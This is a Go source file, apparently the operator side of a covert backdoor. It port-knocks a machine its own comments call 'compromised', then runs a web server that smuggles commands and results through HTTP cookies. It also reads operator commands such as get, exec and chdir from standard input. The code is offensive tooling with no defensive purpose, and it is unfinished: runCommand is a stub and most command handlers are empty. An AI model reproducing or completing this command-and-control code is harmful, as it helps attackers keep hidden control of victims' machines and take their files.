package main

import (
	"bufio"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

type cookieHandler struct {
	commands  chan string
	responses chan string
}

var (
	fileMap = make(map[int]io.Writer)
	fileicr = 0
)

func main() {

	// grab ports to port knock on from command line
	ipAddressOfCompremisedMachine := os.Args[1]
	port1OfCompremisedMachine := os.Args[2]
	port2OfCompremisedMachine := os.Args[3]
	port3OfCompremisedMachine := os.Args[4]

	var c cookieHandler

	c.commands = make(chan string)
	c.responses = make(chan string)

	//execute port knocking on comprmised machine
	portKnock(ipAddressOfCompremisedMachine, port1OfCompremisedMachine, port2OfCompremisedMachine, port3OfCompremisedMachine)
	go waitForConnection(c)

	go handleResponse(c.responses)

	acceptCommandFromStdin(c.commands)

}

func runCommand(commandToRun string) (resultReturned string) {
	print(commandToRun)
	return "test"

}

func portKnock(ip string, port1 string, port2 string, port3 string) {
	conn, err := net.Dial("udp", ip+":"+port1)
	conn.Write([]byte(""))
	connectionError(err)
	time.Sleep(time.Second)
	conn.Close()
	conn, err = net.Dial("udp", ip+":"+port2)
	connectionError(err)
	conn.Write([]byte(""))
	time.Sleep(time.Second)
	conn.Close()
	conn, err = net.Dial("udp", ip+":"+port3)
	connectionError(err)
	conn.Write([]byte(""))
	conn.Close()
}

func waitForConnection(c cookieHandler) {
	var server http.Server

	server.Handler = c
	server.Addr = ":8000"
	server.ListenAndServe()

	//http.HandleFunc("/", cookieHandler)
	//http.ListenAndServe(":8000", nil)
}

func (c cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {

	cookies := request.Cookies()

	for _, myCookie := range cookies {

		c.responses <- myCookie.Value
	}

	var myCookie http.Cookie
	select {
	case myCookie.Value = <-c.commands:
		myCookie.Name = "UUID"
		myCookie.MaxAge = 50
		myCookie.Secure = false
		myCookie.HttpOnly = false
		writer.Header().Set("Set-Cookie", myCookie.String())
	default:

	}

	io.WriteString(writer, "Hello world!")
}

func acceptCommandFromStdin(acceptedCommand chan string) {

	//forever read from stdin

	buffer := bufio.NewReader(os.Stdin)

	for {
		line, err := buffer.ReadBytes('\n')

		if err != nil {
			panic(err)
		}

		splitCommands := strings.Split(strings.TrimSpace(string(line)), " ")

		switch splitCommands[0] {
		case "get":
			if len(splitCommands) != 3 {
				print("useage: get <remotefile> <localfile>")
				continue
			}

			file, err := os.Open(splitCommands[2])
			if err != nil {
				print("file opening failed")
				continue
			}
			fileMap[fileicr] = file
			fileicr++

		case "watch":
		case "exec":
		case "chdir":
		default:

		}

		//acceptedCommand <-

	}
}

func handleResponse(channelResponses chan string) {

	//write a map of concurrent filehandles

	for {

		println(<-channelResponses)
	}

}

func connectionError(err error) {
	if err != nil {
		print(err)
		os.Exit(1)
	}
}
